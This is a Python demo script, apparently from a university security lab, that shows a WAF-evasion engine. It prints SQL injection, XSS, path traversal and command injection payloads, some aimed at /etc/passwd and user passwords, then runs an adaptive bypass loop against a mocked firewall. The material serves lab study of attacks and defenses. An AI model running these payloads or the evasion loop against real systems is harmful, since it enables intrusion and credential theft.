"""
Demo Evasion Engine & Semantic-Preserving Tamper Mutations (Task 10.3)
---------------------------------------------------------------------
Chạy demo:
  python attack-lab/demo_evasion.py
"""

import sys
from pathlib import Path

# Thêm attack-lab vào sys.path để import agent modules
BASE_DIR = Path(__file__).resolve().parent
sys.path.insert(0, str(BASE_DIR))

from agent.evasion import TAMPER_CATALOG, EvasionEngine  # noqa: E402
from agent.tools import DispatchResult  # noqa: E402


def print_banner(title: str):
    print("\n" + "=" * 75)
    print(f"  {title}")
    print("=" * 75)

def demo_tamper_catalog():
    print_banner("1. DEMO: BỘ QUY TẮC BIẾN DỊ BẢO TOÀN NGỮ NGHĨA (TAMPER CATALOG)")

    samples = {
        "SQL_INJECTION": "' UNION SELECT username, password FROM users WHERE id = 1 --",
        "XSS": "<script>alert('XSS_POC')</script><img src=x onerror=alert(1)>",
        "PATH_TRAVERSAL": "../../etc/passwd",
        "COMMAND_INJECTION": "cat /etc/passwd; id; whoami"
    }

    for attack_type, payload in samples.items():
        print(f"\n[+] Phân loại tấn công (Attack Family): {attack_type}")
        print(f"    Payload gốc: {payload}")
        print("    Các kỹ thuật biến dị có sẵn:")

        tampers = TAMPER_CATALOG.get(attack_type, {})
        for name, func in tampers.items():
            mutated = func(payload)
            print(f"      - [{name:<24}]: {mutated}")

def demo_adaptive_evasion_mock():
    print_banner("2. DEMO: VÒNG LẶP NÉ TRÁNH THÍCH ỨNG (ADAPTIVE EVASION ON WAF 403)")
    print("Kịch bản kiểm thử:")
    print(" - Agent gửi payload SQLi nguyên bản.")
    print(" - WAF Gateway phát hiện và chặn lại (HTTP 403, Threat Score: 95.0/100).")
    print(" - Evasion Engine nhận phản hồi 403, tự động chọn kỹ thuật biến dị thích ứng.")
    print(" - Ở vòng lặp tiếp theo, payload biến đổi làm giảm Threat Score và bypass WAF.\n")

    # Giả lập phản hồi WAF Gateway khi nhận các payload biến dị
    simulated_waf_rounds = [
        {"status_code": 403, "threat_score": 95.0, "is_blocked": True, "waf_action": "BLOCK", "confirmed_bypass": False},
        {"status_code": 403, "threat_score": 75.0, "is_blocked": True, "waf_action": "BLOCK", "confirmed_bypass": False},
        {"status_code": 200, "threat_score": 28.5, "is_blocked": False, "waf_action": "MONITOR", "confirmed_bypass": True}
    ]
    step_counter = 0

    class MockDispatcher:
        def dispatch(self, method, path, params=None, json_data=None, data=None, headers=None, bypass_detection_keywords=None):
            nonlocal step_counter
            idx = min(step_counter, len(simulated_waf_rounds) - 1)
            sim = simulated_waf_rounds[idx]
            step_counter += 1

            return DispatchResult(
                status_code=sim["status_code"],
                waf_action=sim["waf_action"],
                waf_threat_score=sim["threat_score"],
                latency_ms=12.4,
                is_blocked=sim["is_blocked"],
                response_body="Blocked by WAF" if sim["is_blocked"] else "Book search results: SQL syntax ok",
                confirmed_bypass=sim["confirmed_bypass"]
            )

    dispatcher = MockDispatcher()
    engine = EvasionEngine(dispatcher=dispatcher, max_attempts=5)

    baseline_sqli = "' UNION SELECT 1, @@version --"
    print(f"[*] Payload ban đầu  : {baseline_sqli}")
    print("[*] Target endpoint   : GET /api/v1/books?title=...")
    print("[*] Đang kích hoạt Evasion Engine...\n")

    report = engine.evade(
        method="GET",
        path="/api/v1/books",
        param_name="title",
        family="SQL_INJECTION",
        baseline_payload=baseline_sqli,
        bypass_keywords=["SQL syntax ok", "@@version"]
    )

    print("-" * 75)
    print("KẾT QUẢ VÒNG LẶP EVASION:")
    status_str = "[VƯỢT WAF THÀNH CÔNG (BYPASS CONFIRMED)]" if report["success"] else "[BỊ CHẶN HOÀN TOÀN]"
    print(f" - Trạng thái           : {status_str}")
    print(f" - Tổng số vòng thử     : {report['total_rounds']}")
    print(f" - Kỹ thuật thành công  : {report['winning_technique']}")
    print(f" - Payload vượt qua WAF : {report['final_payload']}")
    print(f" - Threat Score cuối    : {report['final_threat_score']}/100")

    print("\nNhật ký telemetry chi tiết từng vòng (Rounds Telemetry):")
    for r in report["rounds"]:
        status_txt = f"403 CHẶN (WAF: {r['waf_action']})" if r["is_blocked"] else f"200 THÔNG QUA (WAF: {r['waf_action']})"
        print(f"  [Vòng {r['round']}] Kỹ thuật: {r['technique']:<24}")
        print(f"           Payload     : {r['payload']}")
        print(f"           Kết quả HTTP: {status_txt} | Threat Score: {r['threat_score']}/100 | Trễ: {r['latency_ms']}ms")

def main():
    print("""
===========================================================================
    PBL6 SECURITY LAB — TASK 10.3 EVASION ENGINE DEMONSTRATION
===========================================================================
""")
    demo_tamper_catalog()
    demo_adaptive_evasion_mock()
    print("\n" + "=" * 75)
    print("Demo hoàn tất! Bạn có thể tích hợp trực tiếp module này vào Attack Lab.")
    print("=" * 75)

if __name__ == "__main__":
    main()
